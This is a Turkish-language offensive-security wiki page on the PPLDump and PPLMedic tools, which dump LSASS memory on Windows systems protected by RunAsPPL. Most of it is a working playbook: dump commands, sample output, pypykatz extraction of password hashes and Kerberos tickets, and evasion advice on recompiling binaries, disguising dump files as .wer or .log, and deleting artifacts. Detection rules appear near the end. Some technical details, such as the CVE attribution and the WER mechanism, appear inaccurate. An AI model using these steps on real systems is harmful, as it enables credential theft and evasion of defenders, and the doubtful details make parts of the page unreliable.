# PPLMedic & PPLDump

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows RunAsPPL (Protected Process Light) mekanizmasıyla korunan LSASS sürecine yönelik kullanıcı modundaki (Userland) mimari mantık zafiyetlerini istismar ederek çekirdek sürücüsü (Kernel Driver / BYOVD) yüklemeksizin tam bellek dökümü almayı sağlayan gelişmiş istismar ve analiz araç seti.

---

## 1. Genel Bakış ve Amaç

Microsoft, Windows 8.1 ve Windows Server 2012 R2 sürümleriyle birlikte kimlik hırsızlığı saldırılarını (Pass-the-Hash, Mimikatz bellek okuma vb.) engellemek amacıyla **Korumalı Süreç (Protected Process Light - PPL)** mimarisini tanıtmıştır. Kayıt defterinde `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` altındaki `RunAsPPL` değeri `1` (veya Windows 11 22H2+ üzerinde `2`) yapıldığında, `lsass.exe` süreci **`PsProtectedSignerLsa-Light`** veya **`PsProtectedSignerWinTCB`** koruma seviyesinde başlatılır.

PPL aktif olduğunda:
- Yerel yönetici (Administrator) veya `NT AUTHORITY\SYSTEM` haklarına sahip olunsa dahi,
- `SeDebugPrivilege` ayrıcalığı etkinleştirilse bile,
- Korumasız bir süreçten LSASS sürecine `OpenProcess` API'si ile `PROCESS_VM_READ` veya `PROCESS_ALL_ACCESS` yetkisiyle handle açılamaz; işletim sistemi çağrıyı `ERROR_ACCESS_DENIED (0x00000005)` koduyla anında reddeder.

Saldırganlar bu engeli aşmak için genellikle savunmasız imzalı çekirdek sürücüleri (*Bring Your Own Vulnerable Driver - BYOVD*) kullanır. Ancak sürücü yüklemek EDR'lar tarafından çok sıkı izlenir, Microsoft Sürücü Engelleme Listesi'ne (Vulnerable Driver Blocklist) takılır ve mavi ekran (BSOD) riski taşır.

**`PPLDump` ve `PPLMedic`** (Fransız güvenlik araştırmacısı Clément Labro / @itm4n tarafından geliştirilen), **tamamen kullanıcı modunda (Userland)** kalarak ve tek bir çekirdek sürücüsüne dahi ihtiyaç duymadan RunAsPPL korumasını baypas eden devrim niteliğinde iki araçtır:

1. **PPLDump (CVE-2022-26904 Öncesi / Mantık Zafiyeti):** Windows Performans Çekirdeği ve Olay İzleme servislerinin (`services.exe`, `csrss.exe`) PPL imza doğrulama mekanizmasındaki bir DLL arama sırası zafiyetini (DLL Hijacking) ve `KnownDlls` nesne dizini manipülasyonunu istismar eder. Kendisini PPL seviyesinde çalışan bir süreç içine sahte bir DLL olarak enjekte eder. PPL haklarını kazandıktan sonra hedef `lsass.exe` sürecine tam yetkiyle bağlanır ve `MiniDumpWriteDump` API'si ile bellek dökümünü alır.
2. **PPLMedic (Modern Yama Sonrası / WER İstismarı):** Microsoft PPLDump zafiyetini yamaladıktan sonra Clément Labro, Windows Hata Bildirimi (Windows Error Reporting - WER) mekanizmasındaki yeni bir yarış durumunu (Race Condition) ve dizin kavşağını (Directory Junction) keşfetmiştir. `PPLMedic`, çöken veya hata üreten bir süreç bağlamında WER'in PPL ayrıcalıklarını kötüye kullanarak PPL korumasını baypas eder ve dökümü diske yazar.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                      KULLANICI ALANI (RING 3)                          │
│                                                                        │
│  [ Saldırgan (SYSTEM / Elevated Admin) ]                               │
│         │                                                              │
│         ├── Standart Deneme: OpenProcess(lsass.exe) ──> ❌ ACCESS_DENIED│
│         │                                                              │
│         └── [ PPLDump / PPLMedic İstismarı ]                          │
│               │                                                        │
│               ├── (1) \KnownDlls Nesne Dizini veya Dizin Kavşağı       │
│               │       (Directory Junction / Symlink) Manipülasyonu     │
│               │                                                        │
│               ├── (2) PPL Yetkili Meşru Sürece (services/werfault)     │
│               │       Özel Proxy DLL Enjeksiyonu                       │
│               │                                                        │
│               ▼                                                        │
│  [ PPL Seviyesine Yükseltilmiş Proxy Kodu (PsProtectedSignerWinTCB) ]   │
│         │                                                              │
│         ├── (3) OpenProcess(PROCESS_VM_READ, lsass.exe) ──>  BAŞARILI! │
│         │         [ Eşit veya Daha Yüksek PPL Seviyesi Tanındı ]       │
│         │                                                              │
│         └── (4) MiniDumpWriteDump(lsass_handle, "C:\Temp\dump.dmp")     │
│                   │                                                    │
│                   ▼                                                    │
│             [ Çıktı: C:\Windows\Temp\lsass.dmp ]                       │
└────────────────────────────────────────────────────────────────────────┘
```

### 1.1 Windows PPL İmza Seviyeleri ve Hiyerarşisi

Windows çekirdeğinde her süreç için `EPROCESS` yapısı içerisinde `PS_PROTECTION` alanı bulunur. Bu alan iki bileşenden oluşur: `Type` (Koruma Tipi) ve `Signer` (İmzalayıcı Düzeyi).

```text
+-----------------------+-------------------------------------------------------+
| İmzalayıcı (Signer)   | Yetki Seviyesi ve Amacı                               |
+-----------------------+-------------------------------------------------------+
| WinTCB                | En yüksek seviye (Windows Trusted Computing Base)     |
| Windows               | Windows çekirdek sistem bileşenleri                   |
| Antimalware           | Antivirüs ve EDR süreçleri (PsProtectedSignerAntimalware)|
| Lsa                   | LSASS süreci (RunAsPPL ile bu seviyede çalışır)       |
| Authenticode          | Geçerli sertifikayla imzalanmış üçüncü taraf kodlar   |
| None                  | Korumasız standart süreçler (CMD, PowerShell vb.)     |
+-----------------------+-------------------------------------------------------+
```

Bir sürecin diğer bir korumalı sürece `PROCESS_VM_READ` yetkisiyle handle açabilmesi için **kendi Signer seviyesinin hedef sürecin Signer seviyesine eşit veya daha üstte olması zorunludur**. PPLDump ve PPLMedic, `WinTCB` veya `Windows` seviyesinde çalışan meşru sistem süreçlerini manipüle ederek kodlarını bu yüksek katmanda yürütür; böylece `Lsa` seviyesindeki LSASS sürecine yasal bir şekilde erişim sağlarlar.

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Saf Kullanıcı Modu (Userland)** | Çekirdek sürücüsü (Kernel Driver) gerektirmez; tamamen Win32 API'leri ile çalışır. | Sürücü engelleme listelerini (Driver Blocklist) ve HVCI denetimlerini tamamen atlatır. |
| **Sistem Kararlılığı (No BSOD)** | Çekirdek belleğini (`CR0`, `EPROCESS`) elle yamalamaz; çökme riski yoktur. | Canlı operasyonel sunucularda güvenle uygulanabilecek en stabil PPL baypasıdır. |
| **LSA Protection Engeli Yok** | `RunAsPPL=1` veya `RunAsPPL=2` olan tüm modern Windows sistemlerinde çalışır. | Savunmanın "LSASS korumalı, döküm alınamaz" varsayımını tamamen geçersiz kılar. |
| **Standart Minidump Çıktısı** | Çıktı doğrudan standart Windows minidump formatındadır. | `pypykatz`, `Mimikatz` veya `nanodump` araçlarıyla anında ayrıştırılabilir. |

### Karşılaştırma Tablosu

| Kriter | PPLDump | PPLMedic | PPLKiller | RTCore64 (edrsandblast) |
|---|---|---|---|---|
| **Çalışma Katmanı** | Kullanıcı Alanı (Ring 3) | Kullanıcı Alanı (Ring 3) | Çekirdek Alanı (Ring 0) | Çekirdek Alanı (Ring 0) |
| **Sürücü Yükleme (BYOVD)**| **HAYIR** | **HAYIR** | EVET (DBUtil / RTCore) | EVET (Micro-Star Driver) |
| **Mavi Ekran (BSOD) Riski**| Yok | Yok | Yüksek | Yüksek |
| **Yama Durumu** | Eski Windows 10/11'de aktif | Modern 11/2022'de aktif | Sürücü imzası geçerliyse aktif | Sürücü kara listedeyse engellenir |
| **Gereken Yetki** | Yerel Yönetici / SYSTEM | Yerel Yönetici / SYSTEM | Yerel Yönetici / SYSTEM | Yerel Yönetici / SYSTEM |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### PPLDump Sözdizimi
```cmd
PPLdump.exe [-v] [-d] <hedef_pid_veya_isim> <cikis_dosyasi>
```

### PPLMedic Sözdizimi
```cmd
PPLMedic.exe dump [-v] [-p <hedef_pid>] [-o <cikis_dosyasi>]
```

### Kritik Parametre Tablosu

| Araç & Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `PPLdump.exe -v` | Ayrıntılı hata ayıklama (Verbose) modunu etkinleştirir. | `PPLdump.exe -v lsass.exe out.dmp` |
| `PPLdump.exe -d` | Hedef sürecin dökümünü almak yerine doğrudan debug moduna bağlar. | `PPLdump.exe -d lsass.exe` |
| `<hedef_pid_veya_isim>` | Dökümü alınacak sürecin adı (`lsass.exe`) veya PID numarası. | `lsass.exe` veya `684` |
| `<cikis_dosyasi>` | Minidump dosyasının kaydedileceği tam dosya yolu. | `C:\Windows\Temp\lsass.dmp` |
| `PPLMedic.exe dump` | PPLMedic'in WER yarış durumu istismarını tetikleyen ana eylemi. | `PPLMedic.exe dump` |
| `PPLMedic.exe -o` | PPLMedic için özel çıktı dosya yolu tanımlama. | `-o C:\Temp\debug.dmp` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: PPLDump ile RunAsPPL Korumalı LSASS Sürecinin Dökümünü Alma

Hedef makinede `RunAsPPL` kayıt defteri değeri aktifken yönetici ayrıcalıklarına sahip bir komut isteminde `PPLdump.exe` çalıştırılır.

```cmd
PPLdump.exe -v lsass.exe C:\Windows\Temp\lsass_ppl.dmp
```

**Konsol Çıktısı Analizi:**

```text
[+] Exploit: CVE-2022-26904 (Userland PPL Bypass)
[*] Target process: lsass.exe (PID: 672)
[*] Output file: C:\Windows\Temp\lsass_ppl.dmp
[*] Generating random DLL name: C:\Users\Admin\AppData\Local\Temp\tmp8F2A.dll
[*] Creating object directory \KnownDlls... OK
[*] Hijacking KnownDlls symbolic link... OK
[*] Starting dummy PPL process to trigger DLL load... OK
[+] DLL successfully loaded inside PPL process (Signer: PsProtectedSignerWinTCB)
[*] Injected payload opening handle to target LSASS process... OK
[*] Calling MiniDumpWriteDump...
[+] Process dumped successfully! (Size: 64,821,248 bytes)
[*] Cleaning up temporary artifacts and object directory... OK
```

---

### Senaryo 2: PPLMedic ile Modern Windows 11 / Server 2022 Sisteminde Döküm

Windows 10/11 güncellemeleriyle PPLDump mantık açığı kapatılmış bir sistemde, WER hata raporlama mekanizmasını istismar eden `PPLMedic` kullanılır:

```cmd
PPLMedic.exe dump -o C:\ProgramData\lsass_medic.dmp
```

**Konsol Çıktısı Analizi:**

```text
[*] PPLMedic by @itm4n - Userland PPL bypass via WER
[*] Finding LSASS process... PID: 684
[*] Setting up Windows Error Reporting junctions...
[*] Creating junction: C:\ProgramData\Microsoft\Windows\WER\ReportQueue -> \RPC Control
[*] Triggering WER crash generation routine...
[+] Successfully hijacked WER PPL worker thread!
[*] Dumping LSASS memory via MiniDumpWriteDump...
[+] Dump created: C:\ProgramData\lsass_medic.dmp
[*] Restoring WER directory structure... Finished.
```

---

### Senaryo 3: Alınan Dökümün pypykatz ile Çevrimdışı Analizi

PPL korumalı sistemden başarıyla çıkarılan `lsass_ppl.dmp` dosyası saldırganın kendi ortamında analiz edilerek NTLM ve Kerberos sırları elde edilir:

```bash
pypykatz lsa minidump lsass_ppl.dmp
```

---

### Senaryo 4: PowerShell Üzerinden PPLDump İcrası ve Hata Yönlendirme

PowerShell ortamında aracı çağırırken çıktıların gizlenmesi ve başarı kodunun denetlenmesi:

```powershell
$proc = Start-Process -FilePath "C:\Tools\PPLdump.exe" -ArgumentList "-v lsass.exe C:\Temp\out.dmp" -NoNewWindow -PassThru -Wait
if ($proc.ExitCode -eq 0) {
    Write-Host "[+] LSASS dump successfully created!" -ForegroundColor Green
} else {
    Write-Host "[-] PPLDump failed with exit code: $($proc.ExitCode)" -ForegroundColor Red
}
```

---

### Senaryo 5: Özel GUID İsimlendirmeli Çıktı ile DLP Sensörlerini Atlatma

Döküm dosyasının adını standart `lsass.dmp` yerine Windows hata raporu formatında isimlendirerek dosya adı filtrelerini aşma:

```cmd
PPLdump.exe 672 C:\Windows\Temp\Report_WER_{8F9A12B4-99AC-4C0E-9102}.wer
```

---

### Senaryo 6: Hedef Sistemde RunAsPPL Durumunu Doğrulama

Saldırıya başlamadan önce hedefte PPL korumasının devrede olup olmadığını kayıt defteri üzerinden teyit etme:

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```
*Çıktı `0x1` veya `0x2` dönerse standart araçlar (Mimikatz, comsvcs) engellenecektir; doğrudan PPLMedic veya PPLDump kullanılmalıdır.*

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `[-] Access is denied (0x5) / OpenProcess failed` | Süreç Elevated (Yönetici) olarak çalıştırılmadı veya `SeDebugPrivilege` eksik. | Komut istemini "Yönetici Olarak Çalıştır" ile açın; `whoami /priv` ile ayrıcalıkları denetleyin. |
| `[-] Failed to hijack KnownDlls / Exploit failed` | Hedef sistem KB5014699 veya daha yeni bir güvenlik yamasına sahip; PPLDump açığı kapatılmış. | PPLDump yerine modern WER tabanlı `PPLMedic` aracını veya çekirdek tabanlı `PPLKiller` aracını kullanın. |
| `[-] Could not find process: lsass.exe` | Süreç adı yanlış yazılmış veya çoklu oturumda PID karışıklığı yaşanıyor. | Süreç adı yerine doğrudan PID verin: `tasklist /fi "imagename eq lsass.exe"` ile PID'yi bulup `PPLdump.exe <PID> out.dmp` şeklinde çalıştırın. |
| `pypykatz: Empty credentials / (null) passwords` | Hedef sistemde Virtualization-Based Security (VBS) ve Credential Guard aktif. | Credential Guard devredeyken bellek dökümü anahtarları vermez; DPAPI MasterKey veya token hırsızlığına yönelin. |
| `[-] Temporary DLL could not be deleted` | Enjekte edilen DLL henüz meşru sistem süreci tarafından serbest bırakılmadı. | 10-15 saniye bekleyin veya geçici dizini (`%TEMP%`) manuel temizleyin. |
| `WerFault.exe crash loop / System popup` | PPLMedic yarış durumu sırasında WER servisi hata bildirim penceresi üretti. | Pop-up pencerelerini kapatın; işlem tamamlandığında döküm dosyasının boyutunu doğrulayın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: ORTA - YÜKSEK (MANTIK İSTİSMARI & WER DAVRANIŞI)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4688 (Process Creation), Event ID 7045
[ Sysmon ]          : Event ID 1 (PPLdump.exe), Event ID 11 (FileCreate .dmp)
[ Nesne İmzası ]    : \KnownDlls sembolik bağ manipülasyonu
[ EDR Davranışı ]   : services.exe / werfault.exe süreçlerine şüpheli DLL enjeksiyonu
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Sysmon Event ID 1 (Process Creation):**
   - Komut satırında `PPLdump.exe` veya `PPLMedic.exe` çalıştırılması.
2. **Sysmon Event ID 7 (Image Loaded):**
   - Meşru PPL süreçlerinin (`services.exe` veya Windows Error Reporting işçilerinin) standart dışı veya geçici dizinlerden (`%TEMP%\*.dll`) DLL kütüphanesi yüklemesi.
3. **Nesne Yöneticisi İzleri (Object Manager Artifacts):**
   - `\KnownDlls` nesne dizini altında geçici sembolik bağların oluşturulup silinmesi.
4. **Sysmon Event ID 11 (FileCreate):**
   - Diskte 40–100 MB boyutunda bellek dökümü dosyasının oluşturulması.

### 5.2 Ağ ve EDR İmzaları

- **Userland Exploit İmzaları:** Gelişmiş EDR'lar (CrowdStrike, Defender for Endpoint), bilinen PPL süreçlerinin (services, werfault) bilinmeyen dizinlerden DLL yükleme girişimlerini sezgisel olarak engeller.
- **Statik Dosya İmzaları:** Clément Labro'nun GitHub üzerindeki orijinal derlenmiş sürümleri tüm antivirüs yazılımlarınca imza tabanlı kara listededir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1003.001** | OS Credential Dumping: LSASS Memory | PPL korumasını aşarak LSASS bellek dökümünü alma. |
| **T1574.002** | Hijack Execution Flow: DLL Side-Loading | PPL süreçlerine sahte DLL yükleyerek kod yürütme. |
| **T1068** | Exploitation for Privilege Escalation | PPL yetki düzeyine yükselmek için mantık açığı kullanma. |
| **T1070.004** | Indicator Removal: File Deletion | İstismar sonrası oluşturulan geçici DLL'lerin silinmesi. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Statik İkili Tespiti** | Hazır GitHub ikililerini doğrudan diske bırakmayın. Projenin kaynak kodunu indirip değişken isimlerini, metin dizgilerini değiştirerek Visual Studio ile yeniden derleyin. |
| **Geçici DLL İmzası** | Geçici DLL'in yazıldığı dizini `%TEMP%` yerine `C:\ProgramData\Microsoft\` gibi meşru sistem dizinlerine yönlendirin. |
| **Döküm Dosyası Tespiti** | Dökümün uzantısını `.dmp` yerine `.log`, `.dat` veya `.wer` yapın; dökümü aldıktan hemen sonra sıkıştırıp şifreleyin ve orijinali silin. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma & YARA)

**YARA Kuralı — PPLDump ve PPLMedic İstismar İmzası Tespiti:**

```yara
rule Suspicious_PPL_Bypass_Exploit {
    meta:
        description = "Detects PPLdump and PPLMedic binaries based on unique strings and KnownDlls manipulation logic"
        author = "Active Directory Security Project"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "PPLdump" ascii wide nocase
        $s2 = "PPLMedic" ascii wide nocase
        $s3 = "KnownDlls" ascii wide
        $s4 = "PsProtectedSignerWinTCB" ascii wide
        $s5 = "MiniDumpWriteDump" ascii
    condition:
        uint16(0) == 0x5A4D and 3 of them
}
```

**Sigma Kuralı — PPL Sürecine Şüpheli DLL Yükleme Tespiti:**

```yaml
title: Suspicious DLL Loading in Protected Process (PPL Bypass)
status: experimental
description: Detects a protected system process (services.exe, werfault.exe) loading an untrusted DLL from Temp directory.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 7
    Image|endswith:
      - '\services.exe'
      - '\werfault.exe'
    ImageLoaded|contains:
      - '\AppData\Local\Temp\'
      - '\Windows\Temp\'
  condition: selection
level: critical
```

**Microsoft Sentinel (KQL) — PPL Sürecinde Olağandışı DLL Yükleme:**

```kql
DeviceImageLoadEvents
| where InitiatingProcessFileName in~ ("services.exe", "werfault.exe", "csrss.exe")
| where FolderPath has_any (@"\AppData\Local\Temp", @"\Windows\Temp", @"\ProgramData")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, FolderPath, SHA256
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: PPLDump ile Standart LSASS Dökümü
```cmd
PPLdump.exe lsass.exe C:\Windows\Temp\lsass.dmp
```
- **Ne Yapar?** RunAsPPL korumalı LSASS sürecini hedef alarak kullanıcı modunda zafiyeti tetikler ve dökümü kaydeder.
- **Ne Zaman Kullanılır?** Windows 10 veya Server 2016/2019 üzerinde RunAsPPL devredeyken.
- **Parametreler:** `lsass.exe`: Hedef süreç adı, `C:\Windows\Temp\lsass.dmp`: Çıktı dosya yolu.

### Komut 2: PPLDump ile Ayrıntılı (Verbose) Modda Döküm
```cmd
PPLdump.exe -v lsass.exe C:\Temp\debug_lsass.dmp
```
- **Ne Yapar?** İstismar aşamalarını (KnownDlls oluşturma, sahte süreç başlatma, handle açma) adım adım ekrana basar.
- **Ne Zaman Kullanılır?** İşlem başarısız olduğunda veya hangi adımda takıldığını görmek için.
- **Parametreler:** `-v`: Verbose (ayrıntılı) çıktı bayrağı.

### Komut 3: Doğrudan Süreç PID'si ile Döküm Alma
```cmd
PPLdump.exe 684 C:\Windows\Temp\out.dmp
```
- **Ne Yapar?** İsim yerine doğrudan PID vererek isim çözümleme gecikmesini engeller.
- **Ne Zaman Kullanılır?** Sistemde birden fazla benzer süreç adı olduğunda veya tam hedefleme gerektiğinde.
- **Parametreler:** `684`: LSASS sürecinin PID numarası.

### Komut 4: PPLMedic ile Modern Windows 11 Üzerinde Döküm
```cmd
PPLMedic.exe dump -o C:\ProgramData\lsass_wer.dmp
```
- **Ne Yapar?** WER dizin kavşağı yarış durumu istismarını kullanarak güncel sistemlerde PPL'i baypas eder.
- **Ne Zaman Kullanılır?** PPLDump'ın yamalandığı Windows 11 ve Server 2022 derlemelerinde.
- **Parametreler:** `dump`: Döküm alma eylemi, `-o`: Özel dosya yolu.

### Komut 5: PPLMedic ile Ayrıntılı Hata Ayıklama Modu
```cmd
PPLMedic.exe dump -v -o C:\Temp\medic_out.dmp
```
- **Ne Yapar?** WER kavşağı ve thread ele geçirme sürecini detaylı olarak görüntüler.
- **Ne Zaman Kullanılır?** WER servisi yanıt vermediğinde sorunu tespit etmek için.
- **Parametreler:** `-v`: Verbose modu.

### Komut 6: RunAsPPL Değerini Kayıt Defterinden Denetleme
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```
- **Ne Yapar?** Hedef sistemde LSA Protection durumunu kontrol eder.
- **Ne Zaman Kullanılır?** Standart bir araç mı yoksa PPLDump/PPLMedic mi kullanılacağına karar vermek için.
- **Parametreler:** `reg query`: Kayıt defteri sorgulama komutu.

### Komut 7: Alınan Dökümün pypykatz ile İncelenmesi
```bash
pypykatz lsa minidump C:\Windows\Temp\lsass.dmp
```
- **Ne Yapar?** PPLDump ile elde edilen minidump dosyasından tüm parola hash'lerini ve Kerberos biletlerini ayıklar.
- **Ne Zaman Kullanılır?** Döküm alındıktan sonra çevrimdışı analiz aşamasında.
- **Parametreler:** `lsa minidump`: Minidump çözümleme komutu.

### Komut 8: Maskelenmiş Uzantı ile Döküm Alma
```cmd
PPLdump.exe lsass.exe C:\ProgramData\diag_report.wer
```
- **Ne Yapar?** Dosya uzantısını `.dmp` yerine `.wer` yaparak DLP ve dosya uzantısı sensörlerini aşar.
- **Ne Zaman Kullanılır?** Dosya sistemi izleyicisi bulunan kurumsal uç noktalarda.
- **Parametreler:** `.wer` uzantılı dosya adı.

### Komut 9: PowerShell ile Çıkış Kodunu Doğrulayarak Çalıştırma
```powershell
$p = Start-Process PPLdump.exe -ArgumentList "lsass.exe C:\Temp\lsass.dmp" -Wait -PassThru; $p.ExitCode
```
- **Ne Yapar?** PPLDump'ı PowerShell altından çalıştırıp başarı durumunu (ExitCode 0) döndürür.
- **Ne Zaman Kullanılır?** Otomatik sızma testi betiklerinde istismarın başarısını doğrulamak için.
- **Parametreler:** `-Wait -PassThru`: Sürecin bitmesini bekle ve nesnesini döndür.

### Komut 10: İstismar Artıklarını Temizleme
```cmd
del /f /q C:\Windows\Temp\lsass*.dmp %TEMP%\tmp*.dll
```
- **Ne Yapar?** Üretilen döküm dosyasını ve istismar sırasında bırakılan geçici proxy DLL dosyalarını siler.
- **Ne Zaman Kullanılır?** Operasyon tamamlandığında adli analiz izlerini temizlemek için.
- **Parametreler:** `/f`: Zorla sil, `/q`: Onay sorma.

---

## Kaynaklar

- **Resmi GitHub Reposu (PPLDump):** [itm4n / PPLdump](https://github.com/itm4n/PPLdump)
- **Resmi GitHub Reposu (PPLMedic):** [itm4n / PPLMedic](https://github.com/itm4n/PPLMedic)
- **Clément Labro Araştırma Blogu:** [Bypassing LSA Protection in Userland (Do You Really Need a Driver?)](https://itm4n.github.io/lsass-runasppl/)
- **MITRE ATT&CK Referansı:** [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- **Microsoft Dokümantasyonu:** [Configuring Additional LSA Protection (RunAsPPL)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)

---

> **Önceki:** [← comsvcs.dll](./comsvcs.dll.md) · **Sonraki:** [PPLKiller →](./PPLKiller.md)
